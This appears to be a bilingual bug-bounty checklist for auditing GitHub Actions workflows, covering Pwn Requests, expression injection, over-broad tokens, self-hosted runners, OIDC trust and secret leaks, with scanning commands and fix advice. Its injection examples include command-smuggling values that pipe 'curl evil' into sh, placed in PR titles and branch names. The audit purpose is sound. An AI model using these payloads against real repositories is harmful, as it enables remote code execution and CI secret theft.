---
id: clk-cicd-github-actions
title: CI/CD GitHub Actions
owasp_anchor: [OWASP-CICD-Top10]
cwe: [CWE-78, CWE-732, CWE-94]
severity_typical: P1-P2
playbook: playbooks/cicd_github_actions.yaml
last_updated: 2026-05-14
sources:
  - docs/intelligence_kb/cases/public_reports/11-unauth-idor-on-nasa-gitlab-users-api-pii-hostnames-exposed.md
  - docs/intelligence_kb/cases/researcher_writeups/1-artipacked-github-actions-artifact-token-leak.md
  - docs/intelligence_kb/cases/researcher_writeups/1-breaking-pingora-http-request-smuggling-cache-poisoning-in-cloudflare-s-reverse-proxy.md
  - docs/intelligence_kb/cases/researcher_writeups/107-2-comment-and-control-prompt-injection-to-credential-theft-in-claude-code-gemini-c.md
  - docs/intelligence_kb/cases/researcher_writeups/107-4-ai-agents-identity-risk-supply-chain-attacks-trivy-action-compromise.md
  - docs/intelligence_kb/cases/researcher_writeups/11-codeqleaked-debug-artifacts-exposing-github-tokens.md
  - docs/intelligence_kb/cases/researcher_writeups/16-hackerbot-claw-autonomous-github-actions-exploitation-2026.md
  - docs/intelligence_kb/cases/researcher_writeups/18-prompt-injection-in-github-actions-ai-agents-claude-copilot.md
  - docs/intelligence_kb/cases/researcher_writeups/20-full-read-ssrf-in-gitlab-analytics-dashboard-bypassing-localhost.md
  - docs/intelligence_kb/cases/researcher_writeups/20-gitlab-read-api-token-write-mutation-via-missing-graphql-authz.md
  - docs/intelligence_kb/cases/researcher_writeups/21-gitlab-duo-prompt-injection-via-issue-titles-leading-to-unauthorized-actions.md
  - docs/intelligence_kb/cases/researcher_writeups/25-cve-2026-3854-github-rce-via-git-push-pipeline.md
  - docs/intelligence_kb/cases/researcher_writeups/3-ci-cd-metadata-tokens-leaked-via-js-files.md
  - docs/intelligence_kb/cases/researcher_writeups/4-dompurify-prototype-pollution-to-xss-bypass-cve-2026-41238-via-custom-element-handling.md
  - docs/intelligence_kb/cases/researcher_writeups/8-pwn-request-in-google-s-flank-github-actions-workflow.md
  - docs/intelligence_kb/review_queue/15-bug-bounty-methodology-2025-ci-cd-cloud-section.md
  - docs/intelligence_kb/review_queue/2-bug-bounty-recon-for-everyone.md
  - docs/intelligence_kb/review_queue/resource-15-bug-bounty-methodology-2025-ci-cd-cloud-section.md
  - docs/intelligence_kb/review_queue/resource-2-bug-bounty-recon-for-everyone.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-20-full-read-ssrf-in-gitlab-analytics-dashboard-bypassing-localhost.md
  - docs/intelligence_kb/techniques/new_2024_2026/14-environment-var-exfil-via-ps-auxeww-in-agent-tool-calls-comment-and-control-variant.md
  - docs/intelligence_kb/techniques/new_2024_2026/14-github-actions-pull-request-target-checkout-without-persist-credentials-false.md
  - docs/intelligence_kb/techniques/new_2024_2026/19-github-actions-runner-image-rce-via-supply-chain.md
  - docs/intelligence_kb/techniques/new_2024_2026/2-aws-account-takeover-via-github-actions-oidc-wildcard-trust.md
  - docs/intelligence_kb/techniques/new_2024_2026/20-naabu-httpx-pipeline-after-subfinder.md
  - docs/intelligence_kb/techniques/new_2024_2026/9-github-actions-cache-poisoning-for-supply-chain.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-1-artipacked-github-actions-artifact-token-leak.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-1-breaking-pingora-http-request-smuggling-cache-poisoning-in-cloudflare-s-r.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-11-codeqleaked-debug-artifacts-exposing-github-tokens.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-11-unauth-idor-on-nasa-gitlab-users-api-pii-hostnames-exposed.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-16-hackerbot-claw-autonomous-github-actions-exploitation-2026.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-18-prompt-injection-in-github-actions-ai-agents-claude-copilot.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-21-gitlab-duo-prompt-injection-via-issue-titles-leading-to-unauthorized-act.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-25-cve-2026-3854-github-rce-via-git-push-pipeline.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-3-ci-cd-metadata-tokens-leaked-via-js-files.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-8-pwn-request-in-google-s-flank-github-actions-workflow.md
  - docs/intelligence_kb/techniques/niche_tricks/107-3-what-s-coming-to-our-github-actions-2026-security-roadmap.md
  - docs/intelligence_kb/techniques/niche_tricks/case-derived-20-gitlab-read-api-token-write-mutation-via-missing-graphql-authz.md
  - docs/intelligence_kb/techniques/niche_tricks/case-derived-4-dompurify-prototype-pollution-to-xss-bypass-cve-2026-41238-via-custom-ele.md
maturity: stable
---

# CI/CD GitHub Actions Checklist

> 双语 / Bilingual: GitHub Actions workflow 攻击面，含 pull_request_target、Pwn Request、untrusted checkout、self-hosted runner、Reusable workflow、Composite action、OIDC trust。
> 用法：先 Recon `.github/workflows/*` 列文件 → 按 trigger 类别分支 → 做单 commit poisoning PoC。
> Authorization-only：所有 PoC 走 fork → PR，不直接 push 到 main，不触碰生产 secret。

---

## 1. Recon & 工作流指纹

- [ ] 枚举公共仓库 workflow：`gh api repos/<o>/<r>/actions/workflows`
- [ ] 抓 `.github/workflows/*.yml`，列 trigger 类型：`push` / `pull_request` / `pull_request_target` / `workflow_run` / `workflow_dispatch` / `schedule` / `issue_comment` / `repository_dispatch`
- [ ] 列 secret 引用：`secrets.*` / `vars.*`
- [ ] 列环境：`environment: production` 是否要求 reviewer
- [ ] 列 self-hosted runner：`runs-on: self-hosted` / `runs-on: [self-hosted, linux, ...]`
- [ ] 列 reusable / composite：`uses: org/repo/.github/workflows/x.yml@<ref>` / `uses: org/action@<ref>`
- [ ] 列 third-party action：`uses: marketplace-org/action@<ref>` 是否 pin 到 SHA
- [ ] 是否使用 `permissions: write-all` 或缺省（默认 read-all 还是 write-all 取决于 org）

## 2. pull_request_target Poisoning（Pwn Request）

- [ ] workflow 用 `pull_request_target` 但 checkout `pull_request.head.sha` / `head.ref`
- [ ] 在 fork PR 里改 workflow / 改 build 脚本 → 在主仓 SECRET context 下执行
- [ ] 检查是否有 `actions/checkout@v4` 配 `ref: ${{ github.event.pull_request.head.sha }}`
- [ ] 检查 `npm install` / `pip install` / `make` / `go build` 是否运行 fork 的 untrusted 代码
- [ ] post-checkout 步骤里有没有 `${{ github.event.pull_request.title }}` / `body` / `head.ref` 直接拼到 shell（命令注入）
- [ ] CodeQL action 自身是否在 PR 上下文跑（旧链）
- [ ] 是否能利用 `paths-ignore` / `paths` 触发条件混淆

## 3. workflow_run / issue_comment / repository_dispatch 链

- [ ] `workflow_run` 触发的次级 workflow 拿到上游 `GITHUB_TOKEN` 写权限
- [ ] 上游 artifact 被下游解压 → ZipSlip / 软链接 → 任意写
- [ ] `issue_comment` trigger + `if: contains(github.event.comment.body, '/deploy')` → 任意外部贡献者评论触发
- [ ] `repository_dispatch` 没有签名校验

## 4. 表达式注入（Command Injection via context）

- [ ] `run: echo "${{ github.event.pull_request.title }}"`（标题里塞 `"; curl evil|sh #`）
- [ ] `run: git log --format='${{ github.event.head_commit.message }}'`
- [ ] `${{ github.event.issue.body }}` / `comment.body` / `pages.title`
- [ ] `${{ github.head_ref }}`（branch 名注入：`a;curl evil|sh;b`）
- [ ] `inputs.*`（workflow_dispatch / 复用工作流入参）
- [ ] 用 env 中转仍不安全：`env: TITLE: ${{ github.event.pull_request.title }}` + 后续 `run: echo $TITLE` 才 OK

## 5. GITHUB_TOKEN / 权限过宽

- [ ] 顶层 `permissions:` 缺失 → 全仓默认 `contents: write`（取决于 repo 设置）
- [ ] `id-token: write` 仅在确实用 OIDC 时才开
- [ ] `pull-requests: write` + 反射性回写评论 → 蠕虫式扩散
- [ ] `packages: write` → 推恶意镜像到 GHCR
- [ ] `actions: write` → 改 workflow / 取消别的 run

## 6. Self-hosted Runner

- [ ] runner 是否 ephemeral（一次性）：非 ephemeral 残留 `_work/_temp` 文件 → 跨 PR 污染
- [ ] runner 是否运行在 root / 有 docker.sock 挂载
- [ ] runner 网段是否能直连 prod 内网 / IMDS（169.254.169.254）
- [ ] runner OS / kernel 版本是否带 LPE 漏洞
- [ ] 公共仓库 + 默认 self-hosted = 任意 PR 可在 runner 执行 → 常见高危
- [ ] Auto-scale runner（actions-runner-controller）secret 抽取

## 7. Reusable / Composite Action 供应链

- [ ] `uses: org/action@main`（未 pin SHA）→ 上游被劫持就完蛋
- [ ] `uses: ./local-action`（仓库内）相对路径在 fork checkout 后被替换
- [ ] composite action 的 `run:` 里同样有表达式注入
- [ ] Marketplace 中删库 / 转移 owner 的 action 名抢注（typosquat）
- [ ] action Docker 镜像（`runs.using: docker`）的 `image:` 引用 mutable tag

## 8. OIDC Trust Policy 太松

- [ ] AWS `sts:AssumeRoleWithWebIdentity` trust 含 `token.actions.githubusercontent.com:sub` 仅写 `repo:org/*` 而不限分支
- [ ] GCP Workload Identity Federation `attribute.repository_owner` only → 同 owner 任意仓库可扮演
- [ ] Azure federated credential `subject` 只匹配 `repo:org/x:ref:refs/heads/*` 太宽
- [ ] `audience` 缺失校验
- [ ] OIDC token 的 `job_workflow_ref` 不被 RP 端校验

## 9. Secret Leak 路径

- [ ] log mask 失效：base64 / 拆分输出绕过 `***`
- [ ] `set-output` / 环境文件 `$GITHUB_OUTPUT` 把 secret 暴露给后续 step（cache action 上传）
- [ ] artifact 上传含 `.npmrc` / `~/.docker/config.json` / `id_rsa`
- [ ] 失败回显 trace 里的 `Authorization:` 头
- [ ] cache action key 含 secret hash → 能侧信道
- [ ] PR diff 里历史 commit 残留 secret（用 trufflehog）

## 10. 自动化辅助

```bash
# 列 workflow & 触发
gh api repos/<owner>/<repo>/actions/workflows | jq '.workflows[] | {name, path, state}'

# 抓所有 workflow 文件
gh api repos/<owner>/<repo>/contents/.github/workflows | jq -r '.[].path' | \
  xargs -I{} gh api repos/<owner>/<repo>/contents/{} -H 'Accept: application/vnd.github.raw'

# 用 actionlint 静态扫
actionlint .github/workflows/*.yml

# 专门扫表达式注入 / pwn request
# https://github.com/woodruffw/zizmor
zizmor .github/workflows/

# 历史 secret
trufflehog git https://github.com/<owner>/<repo> --only-verified

# checkov for IaC + GitHub Actions
checkov -d . --framework github_actions

# semgrep ruleset
semgrep --config p/github-actions .github/

# Nuclei 公网 GHA endpoint（仅自有仓库 webhook）
nuclei -tags github-actions -u https://target

# 列出有效 OIDC subject 的工具（自有 trust policy 验证）
# https://github.com/Cyclenerd/github-oidc-azure
# https://github.com/aws-actions/configure-aws-credentials
```

## 11. Reporting Angle

* **Title 模板**：`<workflow> <flaw> allows <attacker> to <impact> via <trigger>`
  例：`pull_request_target with checkout of head.sha allows arbitrary fork to exfiltrate org SECRET via npm install`
* **CVSS 3.1 上下界**：
  * fork PR → 偷 org-level secret / 拿 cloud OIDC role：9.0-9.8 / VRT P1
  * self-hosted runner RCE + 内网 pivot：9.0-9.8 / VRT P1
  * 表达式注入 → 仅当前 repo 写权限：8.0-9.0 / VRT P2
  * 日志泄露 secret：6.5-7.5 / VRT P3
* **CWE 推荐**：CWE-78（命令注入）/ CWE-732（permissions 错配）/ CWE-94（代码注入 via Actions context）
* **PoC 必须**：fork → PR；命令仅打印 `${SECRET:0:4}***${SECRET: -4}`；不外传 secret；附 workflow run URL；自有测试 org / 自有 secret 复现
* **Suggested Fix**（≥ 2 条）：
  * 用 `pull_request` 而非 `pull_request_target`；必须用时严格不 checkout fork code
  * 顶层 `permissions: contents: read`，按 job 最小授权
  * 第三方 action 必须 pin SHA + Dependabot pin updates
  * 通过环境变量传递 untrusted context，禁止直接拼到 `run:`
  * Self-hosted runner 改为 ephemeral + 隔离网络段
  * OIDC trust 收紧 `sub` 到 `repo:org/repo:ref:refs/heads/main`

## 12. 已迁移技法（来自 KB）

- [[techniques/pwn_request_pull_request_target|Pwn Request 经典链]]
- [[techniques/gha_expression_injection|Actions context 表达式注入]]
- [[techniques/self_hosted_runner_takeover|Self-hosted runner 接管]]
- [[techniques/oidc_trust_too_broad|OIDC trust policy 通配滥用]]
